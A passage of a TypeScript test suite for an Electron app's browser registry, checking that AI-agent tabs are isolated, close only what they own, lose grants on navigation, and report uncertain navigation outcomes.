            'https://www.bing.com'
          )
          const prepared = await state.registry.prepareSearchForm(
            target.tabId,
            {
              landingUrl: 'https://www.bing.com/',
              resultUrl: 'https://www.bing.com/search',
              inputSelector: '#query',
              submitSelector: '#submit',
              queryParameter: 'q',
              fields: {},
            },
            'query',
            new AbortController().signal
          )
          const error = await state.registry
            .executeSearchForm(prepared, () => true)
            .then(
              () => 'allowed',
              (error) => error.message
            )
          const receipt = state.registry.takeSearchRedirect(target.tabId)
          target.close()
          results.push({ error, requests, receipt })
        }
        return results
      })
      for (const result of results) {
        assert.equal(result.error, 'browser_search_submission_unknown')
        assert.equal(result.receipt, null)
        assert.deepEqual(result.requests, [
          'https://www.bing.com/',
          'https://www.bing.com/search?q=query',
        ])
      }
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test('product search targets are isolated from birth and close only their owned tab', async () => {
  const temporary = await mkdtemp(join(tmpdir(), 'browser-search-target-'))
  const application = await launchRegistryProbe('', temporary)
  try {
    const result = await application.evaluate(async () => {
      const state = globalThis as unknown as BrowserFixture
      await state.ready
      const registry = state.registry
      await registry.dispatch({ kind: 'open' })
      const manualId = registry.snapshot().activeTabId!
      const manual = registry.target(manualId)
      const search = await registry.createSearchTarget()
      const contents = registry.agentNavigationTarget(search.tabId).contents
      const isolated = !contents.session.isPersistent() && contents.session !== manual.session
      const publicTargets = registry.externalTabIds()
      await contents.executeJavaScriptInIsolatedWorld(1003, [
        { code: "window.open('https://example.org/'); null" },
      ])
      const tabsBeforeClose = registry.snapshot().tabs.length
      const destroyed = new Promise<void>((resolve) => contents.once('destroyed', resolve))
      search.close()
      search.close()
      await destroyed
      return {
        isolated,
        publicTargets,
        manualId,
        tabsBeforeClose,
        destroyed: contents.isDestroyed(),
        manualAlive: !manual.isDestroyed(),
        remaining: registry.snapshot().tabs.map((tab) => tab.tabId),
      }
    })
    assert.equal(result.isolated, true)
    assert.deepEqual(result.publicTargets, [result.manualId])
    assert.equal(result.tabsBeforeClose, 2)
    assert.equal(result.destroyed, true)
    assert.equal(result.manualAlive, true)
    assert.deepEqual(result.remaining, [result.manualId])
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
  }
})

test('dialogue-created blank tabs are private from birth and remain user-closeable', async () => {
  const temporary = await mkdtemp(join(tmpdir(), 'browser-dialogue-target-'))
  const application = await launchRegistryProbe('', temporary)
  try {
    const result = await application.evaluate(async () => {
      const state = globalThis as unknown as BrowserFixture
      await state.ready
      const target = await state.registry.createAgentTarget('owner')
      const contents = state.registry.agentNavigationTarget(target.tabId).contents
      const privateFromBirth =
        !contents.session.isPersistent() && state.registry.externalTabIds().length === 0
      await state.registry.dispatch({ kind: 'close', tabId: target.tabId })
      target.close()
      return { privateFromBirth, remaining: state.registry.snapshot().tabs.length }
    })
    assert.equal(result.privateFromBirth, true)
    assert.equal(result.remaining, 0)
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
  }
})

test('agent close only closes its session-owned live entry, never manual or foreign tabs', async () => {
  const temporary = await mkdtemp(join(tmpdir(), 'browser-owned-close-'))
  const application = await launchRegistryProbe('', temporary)
  try {
    const result = await application.evaluate(async () => {
      const state = globalThis as unknown as BrowserFixture
      await state.ready
      const registry = state.registry
      const owned = await registry.createAgentTarget('owner')
      await registry.dispatch({ kind: 'open' })
      const manual = registry.snapshot().activeTabId!
      const rejects = (sessionId: string, tabId: string) => {
        try {
          registry.closeAgentTarget(sessionId, tabId)
          return false
        } catch {
          return true
        }
      }
      const foreign = rejects('other', owned.tabId)
      const manualDenied = rejects('owner', manual)
      registry.closeAgentTarget('owner', owned.tabId)
      const stale = rejects('owner', owned.tabId)
      return {
        foreign,
        manualDenied,
        stale,
        remaining: registry.snapshot().tabs.map((tab) => tab.tabId),
        manual,
      }
    })
    assert.equal(result.foreign, true)
    assert.equal(result.manualDenied, true)
    assert.equal(result.stale, true)
    assert.deepEqual(result.remaining, [result.manual])
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
  }
})

test('owned close follows the committed navigation replacement, not stale contents', async () => {
  const fixture = createServer((_incoming, response) => {
    response.end('<title>Owned page</title>')
  })
  fixture.listen(0, '127.0.0.1')
  await once(fixture, 'listening')
  const address = fixture.address()
  assert.ok(address && typeof address !== 'string')
  const origin = `http://127.0.0.1:${address.port}`
  const temporary = await mkdtemp(join(tmpdir(), 'browser-owned-navigation-'))
  const application = await launchRegistryProbe(origin, temporary)
  try {
    const result = await application.evaluate(async (_electron, url) => {
      const state = globalThis as unknown as BrowserFixture
      await state.ready
      const registry = state.registry
      const owned = await registry.createAgentTarget('owner')
      const original = registry.target(owned.tabId)
      await registry.dispatch({ kind: 'navigate', tabId: owned.tabId, input: url })
      const replaced = registry.target(owned.tabId) !== original
      registry.closeAgentTarget('owner', owned.tabId)
      return { replaced, remaining: registry.snapshot().tabs.length }
    }, origin)
    assert.equal(result.replaced, true)
    assert.equal(result.remaining, 0)
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
    fixture.closeAllConnections()
    await new Promise<void>((resolve) => fixture.close(() => resolve()))
  }
})

test(
  'real registry menu targets bind active contents instance and main-frame navigation',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-menu-target-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const before = registry.menuTarget(tabId)
        contents.emit('did-start-navigation', {
          isMainFrame: false,
          isSameDocument: false,
          url: 'https://example.org/frame',
        })
        const afterSubframe = registry.menuTarget(tabId)
        contents.emit('did-start-navigation', {
          isMainFrame: true,
          isSameDocument: true,
          url: 'about:blank#section',
        })
        const afterMainFrame = registry.menuTarget(tabId)
        await registry.dispatch({ kind: 'open' })
        let inactiveRejected = false
        try {
          registry.menuTarget(tabId)
        } catch {
          inactiveRejected = true
        }
        const other = registry.menuTarget(registry.snapshot().activeTabId!)
        await registry.dispatch({ kind: 'select', tabId })
        const returned = registry.menuTarget(tabId)
        let staleRejected = false
        try {
          await registry.page({
            kind: 'zoom',
            target: {
              tabId,
              instanceId: afterMainFrame.instanceId,
              navigationId: afterMainFrame.navigationId,
            },
            factor: 1.25,
          })
        } catch {
          staleRejected = true
        }
        return {
          sameSubframe: before.navigationId === afterSubframe.navigationId,
          advancedMainFrame: afterMainFrame.navigationId === before.navigationId + 1,
          stableInstance: before.instanceId === afterMainFrame.instanceId,
          differentInstance: other.instanceId !== before.instanceId,
          inactiveRejected,
          activationAdvanced: returned.navigationId > afterMainFrame.navigationId,
          staleRejected,
        }
      })
      assert.deepEqual(result, {
        sameSubframe: true,
        advancedMainFrame: true,
        stableInstance: true,
        differentInstance: true,
        inactiveRejected: true,
        activationAdvanced: true,
        staleRejected: true,
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'actual WebContents per-tab zoom mode isolates two same-origin pages and rejects unsupported levels',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => response.end('<title>Zoom page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-page-zoom-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      application = await launchRegistryProbe(origin, temporary)
      const result = await application.evaluate(async (_electron, origin) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${origin}/first` })
        const first = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'open', input: `${origin}/second` })
        const second = registry.snapshot().activeTabId!
        const target = registry.menuTarget(second)
        const expected = {
          tabId: second,
          instanceId: target.instanceId,
          navigationId: target.navigationId,
        }
        await registry.page({ kind: 'zoom', target: expected, factor: 1.25 })
        let unsupportedRejected = false
        try {
          await registry.page({ kind: 'zoom', target: expected, factor: 1.21 })
        } catch {
          unsupportedRejected = true
        }
        const isolated = {
          first: registry.target(first).getZoomFactor(),
          second: registry.target(second).getZoomFactor(),
        }
        await registry.page({ kind: 'zoom', target: expected, factor: 1 })
        return {
          isolated,
          reset: registry.target(second).getZoomFactor(),
          modes: [registry.target(first).getZoomMode(), registry.target(second).getZoomMode()],
          unsupportedRejected,
        }
      }, origin)
      assert.deepEqual(result, {
        isolated: { first: 1, second: 1.25 },
        reset: 1,
        modes: ['isolated', 'isolated'],
        unsupportedRejected: true,
      })
    } finally {
      await application?.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

async function launchRegistryProbe(
  origin: string,
  temporary: string,
  privateAlias = false,
  home = join(temporary, 'home'),
  historyEnabled = false,
  nativeInput = false
) {
  const entry = join(temporary, 'main.cjs')
  await build({
    stdin: {
      contents: `
    import { app, BrowserWindow } from 'electron'
    import { EventEmitter } from 'node:events'
    import { promises as dns } from 'node:dns'
    import { createBrowserRegistry } from './src/main/browser.ts'
    import { createBrowserReadGrants } from './src/main/grant.ts'
    import { selectStorage, publishStorage } from './src/main/storage.ts'
    app.setPath('userData', ${JSON.stringify(join(temporary, 'profile'))})
    app.setPath('sessionData', ${JSON.stringify(join(temporary, 'sessionData'))})
    app.commandLine.appendSwitch('use-mock-keychain')
    if (${nativeInput}) {
      for (const flag of ['allow-pre-commit-input', 'disable-background-timer-throttling',
        'disable-backgrounding-occluded-windows', 'disable-renderer-backgrounding', 'disable-features']) app.commandLine.removeSwitch(flag)
    }
    if (!process.env.SCHOLARSEED_HOME) throw new Error('Probe requires isolated home')
    const unexpectedPointer = () => { throw new Error('Explicit probe home must not read pointer') }
    publishStorage(selectStorage('browser-probe', {
      pin: unexpectedPointer, readAt: unexpectedPointer, release: unexpectedPointer
    }))
    globalThis.downloadItem = (url, onSave) => {
      const item = Object.assign(new EventEmitter(), {
        getURLChain: () => [url],
        getURL: () => url,
        getFilename: () => 'file.txt',
        setSaveDialogOptions: onSave,
        cancel: () => item.emit('done', {}, 'cancelled'),
      })
      return item
    }
    globalThis.createSearchGrants = createBrowserReadGrants
    globalThis.ready = app.whenReady().then(() => {
      if (${JSON.stringify(privateAlias)}) {
        const originalLookup = dns.lookup
        globalThis.privateLookupCount = 0
        dns.lookup = (hostname, options) => hostname === 'private-alias.example'
          ? (globalThis.privateLookupCount++, Promise.resolve([{ address: '127.0.0.1', family: 4 }]))
          : originalLookup(hostname, options)
      }
      const window = new BrowserWindow({ show: false })
      globalThis.browserWindow = window
      globalThis.pageFocusCount = 0
      globalThis.logs = []
      globalThis.throwSearchLogs = false
      globalThis.registry = createBrowserRegistry(window, { apiBase: ${JSON.stringify(origin)}, publish() {}, log(message) {
        globalThis.logs.push(message)
        if (globalThis.throwSearchLogs && message.startsWith('[browser-search-')) throw new Error('diagnostic sink unavailable')
      },
        onPageFocus: () => { globalThis.pageFocusCount++ },
        historyAgentUseRevision: () => ${historyEnabled ? '1' : 'null'} })
    })
  `,
      resolveDir: resolve('.'),
    },
    outfile: entry,
    platform: 'node',
    format: 'cjs',
    bundle: true,
    external: ['electron', './lease.node'],
  })
  const environment = Object.fromEntries(
    Object.entries(process.env).filter((entry): entry is [string, string] => entry[1] !== undefined)
  )
  delete environment.ELECTRON_RUN_AS_NODE
  environment.SCHOLARSEED_HOME = home
  return _electron.launch({ args: [entry], env: environment })
}

test(
  'real Electron history clear waits for an Agent result response lease',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-history-clear-lease-'))
    const application = await launchRegistryProbe(
      '',
      temporary,
      false,
      join(temporary, 'home'),
      true
    )
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const owner = {}
        registry.historyAgent.watchOwner(owner, new Promise<void>(() => {}))
        const scope = {
          sessionId: 'session',
          instanceId: 'instance',
          productTurnId: 'product-turn',
          turnId: 'turn',
          generation: 1,
          interruptGeneration: 0,
          lifecycleEpoch: 1,
        }
        const proof = registry.historyAgent.prepare({
          scope,
          requestId: 'request',
          search: 'private',
          offset: 0,
          limit: 1,
          intent: 'Find prior visit',
        })
        registry.historyAgent.grant({
          scope,
          requestId: 'request',
          proofId: proof.proofId,
          queryDigest: proof.queryDigest,
          historyRevision: proof.historyRevision,
          expiresAt: proof.expiresAt,
        })
        registry.historyAgent.execute({
          scope,
          requestId: 'request',
          proofId: proof.proofId,
          owner,
        })
        let settled = false
        const clearing = registry.clearData({ kind: 'clear-history' }).then(() => {
          settled = true
        })
        await new Promise((resolve) => setTimeout(resolve, 25))
        const blocked = !settled
        registry.historyAgent.complete({ scope, requestId: 'request', proofId: proof.proofId })
        await clearing
        return { blocked, settled }
      })
      assert.deepEqual(result, { blocked: true, settled: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'real Electron browser disposal waits for the old history response lease',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-history-dispose-lease-'))
    const application = await launchRegistryProbe(
      '',
      temporary,
      false,
      join(temporary, 'home'),
      true
    )
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const owner = {}
        registry.historyAgent.watchOwner(owner, new Promise<void>(() => {}))
        const scope = {
          sessionId: 'session',
          instanceId: 'instance',
          productTurnId: 'product-turn',
          turnId: 'turn',
          generation: 1,
          interruptGeneration: 0,
          lifecycleEpoch: 1,
        }
        const proof = registry.historyAgent.prepare({
          scope,
          requestId: 'request',
          search: 'private',
          offset: 0,
          limit: 1,
          intent: 'Find prior visit',
        })
        registry.historyAgent.grant({
          scope,
          requestId: 'request',
          proofId: proof.proofId,
          queryDigest: proof.queryDigest,
          historyRevision: proof.historyRevision,
          expiresAt: proof.expiresAt,
        })
        registry.historyAgent.execute({
          scope,
          requestId: 'request',
          proofId: proof.proofId,
          owner,
        })
        let settled = false
        const disposing = registry.dispose().then(() => {
          settled = true
        })
        await new Promise((resolve) => setTimeout(resolve, 1_000))
        const blocked = !settled
        registry.historyAgent.complete({ scope, requestId: 'request', proofId: proof.proofId })
        await disposing
        return { blocked, settled }
      })
      assert.deepEqual(result, { blocked: true, settled: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'external CDP target access excludes Agent-isolated tabs after context swap',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-external-target-isolation-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const manualVisible = registry.externalTabIds().includes(tabId)
        const manualTarget = registry.externalTarget(tabId) === registry.target(tabId)
        const prototype = Object.getPrototypeOf(registry.target(tabId)) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        try {
          prototype.loadURL = async function (this: Electron.WebContents, url: string) {
            Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
            this.emit('did-navigate', {} as Electron.Event, url, 200)
            this.emit('dom-ready')
          }
          await registry.agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
        } finally {
          prototype.loadURL = originalLoad
        }
        const agentVisible = registry.externalTabIds().includes(tabId)
        let externalTargetDenied = false
        let externalAttachDenied = false
        try {
          registry.externalTarget(tabId)
        } catch {
          externalTargetDenied = true
        }
        try {
          registry.attachExternal(tabId)
        } catch {
          externalAttachDenied = true
        }
        return {
          manualVisible,
          manualTarget,
          agentVisible,
          externalTargetDenied,
          externalAttachDenied,
        }
      })
      assert.deepEqual(result, {
        manualVisible: true,
        manualTarget: true,
        agentVisible: false,
        externalTargetDenied: true,
        externalAttachDenied: true,
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

function portOpen(port: number): Promise<boolean> {
  return new Promise((resolve) => {
    const socket = connect(port, '127.0.0.1')
    socket.once('connect', () => {
      socket.destroy()
      resolve(true)
    })
    socket.once('error', () => resolve(false))
  })
}

test(
  'page focus follows current registry ownership after staged promotion',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-overlay-focus-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture & { pageFocusCount: number }
        await state.ready
        const { registry } = state
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const initial = registry.target(tabId)
        initial.emit('focus')
        const registered = state.pageFocusCount
        const prototype = Object.getPrototypeOf(initial) as {
          loadURL: (url: string) => Promise<void>
        }
        const original = prototype.loadURL
        let stagedCount = -1
        prototype.loadURL = async function (this: WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('focus')
          stagedCount = state.pageFocusCount
          this.emit('did-start-navigation', { isMainFrame: true, isSameDocument: false, url })
          this.emit('did-frame-navigate', {}, url, 200, 'OK', true, 0, 0)
          this.emit('dom-ready')
        }
        try {
          await registry.agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
        } finally {
          prototype.loadURL = original
        }
        const promoted = registry.target(tabId)
        promoted.emit('focus')
        return {
          registered,
          stagedCount,
          promoted: state.pageFocusCount,
          replaced: promoted !== initial,
        }
      })
      assert.deepEqual(result, { registered: 1, stagedCount: 1, promoted: 2, replaced: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'real Electron registry invalidates Agent grants on reload and tab close',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-grant-invalidation-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const registry = (globalThis as unknown as BrowserFixture).registry
        const invalidated: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((tabId) => invalidated.push(tabId))
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'reload', tabId })
        const afterReload = invalidated.length
        await registry.dispatch({ kind: 'close', tabId })
        unsubscribe()
        return { tabId, invalidated, afterReload }
      })
      assert.ok(result.afterReload >= 1)
      assert.ok(result.invalidated.length > result.afterReload)
      assert.ok(result.invalidated.every((tabId) => tabId === result.tabId))
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test('registry distinguishes document invalidation from explicit authority revocation', async () => {
  const temporary = await mkdtemp(join(tmpdir(), 'browser-invalidation-reason-'))
  const application = await launchRegistryProbe('', temporary)
  try {
    const result = await application.evaluate(async () => {
      const state = globalThis as unknown as BrowserFixture
      await state.ready
      const target = await state.registry.createAgentTarget('owner')
      const events: unknown[][] = []
      const unsubscribe = state.registry.onAgentTargetInvalidated((...args) => events.push(args))
      const contents = state.registry.agentNavigationTarget(target.tabId).contents
      contents.emit('did-navigate-in-page', {}, 'https://example.org/', true)
      const navigation = events.splice(0)
      await state.registry.dispatch({ kind: 'close', tabId: target.tabId })
      const cancellation = events.splice(0)
      unsubscribe()
      target.close()
      return { tabId: target.tabId, navigation, cancellation }
    })
    assert.deepEqual(result.navigation, [[result.tabId, 'external', 'navigation']])
    assert.deepEqual(result.cancellation, [[result.tabId, 'external', 'authority']])
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
  }
})

test(
  'cancelled Agent navigation stays unknown until its issued load reaches a terminal result',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-navigation-cancel-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
          stop: () => void
        }
        const originalLoad = prototype.loadURL
        const originalStop = prototype.stop
        let issued!: () => void
        let finishLoad!: () => void
        const started = new Promise<void>((resolve) => {
          issued = resolve
        })
        const loading = new Promise<void>((resolve) => {
          finishLoad = resolve
        })
        let stopped = 0
        prototype.loadURL = () => {
          issued()
          return loading
        }
        prototype.stop = () => {
          stopped += 1
        }
        const navigation = registry
          .agentNavigate(tabId, 'https://example.org/', 'https://example.org')
          .then(
            () => 'succeeded',
            (error) => (error as Error).message
          )
        await started
        registry.cancelAgentNavigation(tabId)
        const beforeTerminal = await Promise.race([
          navigation.then(() => 'settled'),
          new Promise<'pending'>((resolve) => setTimeout(() => resolve('pending'), 100)),
        ])
        finishLoad()
        const outcome = await navigation
        prototype.loadURL = originalLoad
        prototype.stop = originalStop
        return { beforeTerminal, stopped, outcome }
      })
      assert.deepEqual(result, {
        beforeTerminal: 'pending',
        stopped: 1,
        outcome: 'navigation_outcome_unknown',
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent navigation retains a load failure cause after dom-ready without claiming success',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-network-cause-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const prototype = Object.getPrototypeOf(registry.target(tabId)) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('dom-ready')
          return Promise.reject(
            Object.assign(new Error('load failed'), { code: 'ERR_INTERNET_DISCONNECTED' })
          )
        }
        try {
          await registry.agentNavigate(tabId, 'https://example.org/', 'https://example.org')
          return { message: 'unexpected_success', code: null }
        } catch (error) {
          return {
            message: (error as Error).message,
            code: ((error as Error).cause as { code?: string } | undefined)?.code ?? null,
          }
        } finally {
          prototype.loadURL = originalLoad
        }
      })
      assert.deepEqual(result, {
        message: 'navigation_outcome_unknown',
        code: 'ERR_INTERNET_DISCONNECTED',
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent-owned navigation invalidates read targets without revoking its issued load',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-navigation-revoke-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const invalidations: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) => {
          invalidations.push(kind)
          if (kind === 'external') registry.cancelAgentNavigation(tabId)
        })
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        const outcome = await registry
          .agentNavigate(tabId, 'https://example.org/', 'https://example.org')
          .then(
            () => 'succeeded',
            (error) => (error as Error).message
          )
        prototype.loadURL = originalLoad
        unsubscribe()
        return { invalidations, outcome }
      })
      assert.deepEqual(result, { invalidations: ['target', 'target'], outcome: 'succeeded' })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'concurrent same-origin page navigation revokes an issued Agent load',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-navigation-race-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        let stagedContents: Electron.WebContents | null = null
        let issued!: () => void
        let finishLoad!: () => void
        const started = new Promise<void>((resolve) => {
          issued = resolve
        })
        const loading = new Promise<void>((resolve) => {
          finishLoad = resolve
        })
        prototype.loadURL = function (this: Electron.WebContents) {
          stagedContents = this
          issued()
          return loading
        }
        const invalidations: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) =>
          invalidations.push(kind)
        )
        const navigation = registry
          .agentNavigate(tabId, 'https://example.org/', 'https://example.org')
          .then(
            () => 'succeeded',
            (error) => (error as Error).message
          )
        await started
        let prevented = false
        stagedContents!.emit(
          'will-navigate',
          {
            preventDefault: () => {
              prevented = true
            },
          } as Electron.Event,
          'https://example.org/other'
        )
        finishLoad()
        const outcome = await navigation
        prototype.loadURL = originalLoad
        unsubscribe()
        return { invalidations, outcome, prevented }
      })
      assert.deepEqual(result, {
        invalidations: ['target', 'external'],
        outcome: 'navigation_outcome_unknown',
        prevented: false,
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'same-origin redirect belongs to the issued Agent load but an unlisted commit does not',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-redirect-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const results = []
        for (const committedUrl of [
          'https://example.org/redirected',
          'https://example.org/unlisted',
        ]) {
          await registry.dispatch({ kind: 'open' })
          const tabId = registry.snapshot().activeTabId!
          const contents = registry.target(tabId)
          const prototype = Object.getPrototypeOf(contents) as {
            loadURL: (url: string) => Promise<void>
          }
          const originalLoad = prototype.loadURL
          const invalidations: string[] = []
          const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) =>
            invalidations.push(kind)
          )
          prototype.loadURL = async function (this: Electron.WebContents) {
            if (committedUrl.endsWith('/redirected')) {
              this.emit('will-redirect', { preventDefault() {} } as Electron.Event, committedUrl)
            }
            Object.defineProperty(this, 'getURL', { value: () => committedUrl, configurable: true })
            this.emit('did-navigate', {} as Electron.Event, committedUrl, 200)
            this.emit('dom-ready')
          }
          const outcome = await registry
            .agentNavigate(tabId, 'https://example.org/', 'https://example.org')
            .then(
              () => 'succeeded',
              (error) => (error as Error).message
            )
          prototype.loadURL = originalLoad
          unsubscribe()
          results.push({ invalidations, outcome })
        }
        return results
      })
      assert.deepEqual(result, [
        { invalidations: ['target', 'target', 'target'], outcome: 'succeeded' },
        { invalidations: ['target', 'external'], outcome: 'navigation_outcome_unknown' },
      ])
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'same-document notification for the issued destination preserves the pending Agent load',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-document-update-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        const state = globalThis as unknown as BrowserFixture
        await state.ready
        const registry = state.registry
        const url = 'https://example.org/'
        const results = []
        for (const destination of [url, `${url}unapproved`, 'https://other.example.org/']) {
          await registry.dispatch({ kind: 'open' })
          const tabId = registry.snapshot().activeTabId!
          const prototype = Object.getPrototypeOf(registry.target(tabId))
          const originalLoad = prototype.loadURL
          const invalidations: string[] = []
          const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) =>
            invalidations.push(kind)
          )
          prototype.loadURL = async function (this: Electron.WebContents) {
            Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
            this.emit('did-start-navigation', {
              url,
              isMainFrame: true,
              isSameDocument: false,
              initiator: null,
            })
            this.emit('did-start-navigation', {
              url: destination,
              isMainFrame: true,
              isSameDocument: true,
              initiator: null,
            })
            this.emit('did-navigate-in-page', {} as Electron.Event, destination, true)
            this.emit('dom-ready')
          }
          const outcome = await registry.agentNavigate(tabId, url, 'https://example.org').then(
            () => 'succeeded',
            (error) => (error as Error).message
          )
          prototype.loadURL = originalLoad
          unsubscribe()
          results.push({ outcome, invalidations })
        }
        return results
      })
      assert.deepEqual(result, [
        { outcome: 'succeeded', invalidations: ['target', 'target', 'target'] },
        {
          outcome: 'navigation_outcome_unknown',
          invalidations: ['target', 'external', 'external'],
        },
        {
          outcome: 'navigation_outcome_unknown',
          invalidations: ['target', 'external', 'external'],
        },
      ])
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'second main-frame start with the same URL cannot inherit Agent navigation ownership',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-direct-navigation-race-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
